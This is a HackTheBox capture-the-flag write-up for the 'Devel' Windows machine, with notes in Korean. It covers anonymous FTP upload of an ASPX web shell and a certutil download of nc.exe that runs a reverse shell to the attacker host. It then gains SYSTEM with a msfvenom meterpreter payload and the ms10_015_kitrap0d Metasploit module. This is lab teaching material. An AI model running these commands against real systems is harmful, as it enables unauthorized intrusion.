# Devel - HackTheBox
## Recon
```bash
sudo nmap -p 21,80 -sC -sV -vv -oA devel 10.10.10.5
```
<img width="1107" height="297" alt="image" src="https://github.com/user-attachments/assets/99dcdf86-ff61-4644-915d-c6272dbb0e05" />

- FTP(21)
- HTTP(80)

---
## HTTP
### banner grabbing
<img width="1107" height="327" alt="image" src="https://github.com/user-attachments/assets/f662acf9-5dbb-4424-9d43-ec91b0d704eb" />

## FTP
- `anonymous`로그인 성공.
```bash
ftp 10.10.10.5
```
<img width="1107" height="308" alt="image" src="https://github.com/user-attachments/assets/6a596822-45fb-490f-b745-7787085b670a" />

<br>
<br>

- `iisstart.htb`파일을 로컬로 다운로드 받아서 확인해보니 서버의 메인페이지와 같은 코드.
<img width="1107" height="609" alt="image" src="https://github.com/user-attachments/assets/2005c381-1e49-4706-a434-0258ddf0f6e3" />

<br>
<br>

<img width="1100" height="479" alt="image" src="https://github.com/user-attachments/assets/6ae5f312-bda6-4a6f-949d-c8c8381a7f83" />

<br>
<br>

- `test.txt`를 만들어서 업로드 시도하여 성공.
<img width="1107" height="286" alt="image" src="https://github.com/user-attachments/assets/a20dce90-38d3-452f-b3be-b4a4053e3806" />

<br>
<br>

- 웹 셸 업로드.(/usr/share/webshells/aspx/cmdasp.aspx)
<img width="1107" height="304" alt="image" src="https://github.com/user-attachments/assets/356fcead-018f-498a-9b70-0cbc6fc6c6fb" />

<br>
<br>

- 명령 실행 성공.
<img width="878" height="105" alt="image" src="https://github.com/user-attachments/assets/5340b343-b09c-4728-bf8b-f0e89402c76a" />

<br>
<br>

- `nc.exe`를 로컬로부터 다운로드 받아서 실행.
```
certutil -urlcache -f -split http://10.10.16.4/nc.exe c:\\windows\\temp\\nc.exe

 c:\\windows\\temp\\nc.exe 10.10.16.4 80 -e cmd.exe
```
<img width="878" height="105" alt="image" src="https://github.com/user-attachments/assets/5ae5a062-3564-42ba-a12a-1a5ab8eb8e43" />

<br>
<br>

- 셸 획득.
<img width="1108" height="210" alt="image" src="https://github.com/user-attachments/assets/6a839bda-9844-4bda-a380-6ccd26e4abb0" />

---
## Privesc
- 오래된 OS버전이라 `metasploit`을 사용.
- `msf.aspx` 생성하여 `ftp`로 업로드.
```bash
msfvenom -p windows/meterpreter/reverse_tcp lhost=tun0 lport=80 -f aspx -o msf.aspx
```
<img width="1108" height="164" alt="image" src="https://github.com/user-attachments/assets/613137d5-078a-4374-bec4-3a1334a7b633" />

<br>
<br>

- 리버스 셸 실행.
```bash
curl 'http://10.10.10.5/msf.aspx'
```
<img width="1108" height="58" alt="image" src="https://github.com/user-attachments/assets/3393aa00-ebf7-45c7-9dd6-33b298ffc1f3" />

<br>
<br>

- 리버스 셸 획득.
```
msfconsole -q

msf > use /multi/handler

msf exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp

msf exploit(multi/handler) > set lhost tun0

msf exploit(multi/handler) > set lport 80

msf exploit(multi/handler) > run
```
<img width="1108" height="329" alt="image" src="https://github.com/user-attachments/assets/57e419e9-e191-4123-bb07-759e22ce78b3" />

<br>
<br>

- `local_exploit_suggester`모듈 사용.
```
meterpreter > bg

msf exploit(multi/handler) > search suggester

msf exploit(multi/handler) > use 0

msf post(multi/recon/local_exploit_suggester) > set session 1

msf post(multi/recon/local_exploit_suggester) > run
```
<img width="890" height="500" alt="image" src="https://github.com/user-attachments/assets/6169745d-6cd9-474f-a2d5-a5c9f310e9cc" />

<br>
<br>

- `ms10_015_kitrap0d`모듈 사용.
```
msf exploit(windows/local/cve_2020_0787_bits_arbitrary_file_move) > search ms10_015

msf exploit(windows/local/cve_2020_0787_bits_arbitrary_file_move) > use 0

msf exploit(windows/local/ms10_015_kitrap0d) > set session 1

msf exploit(windows/local/ms10_015_kitrap0d) > set lhost tun0

msf exploit(windows/local/ms10_015_kitrap0d) > run

meterpreter > shell
```
<img width="1108" height="201" alt="image" src="https://github.com/user-attachments/assets/a356861b-4e9a-47be-b87e-89999204441b" />

---
## FLAG
- `c:\users\babis\desktop\user.txt`
<img width="1108" height="262" alt="image" src="https://github.com/user-attachments/assets/7e2c76a2-9f4e-40fb-be2f-27e872a98a03" />

<br>
<br>

- `c:\users\administrator\desktop\root.txt`
<img width="1108" height="248" alt="image" src="https://github.com/user-attachments/assets/0c058100-80c3-4072-a12f-b07bc9593856" />
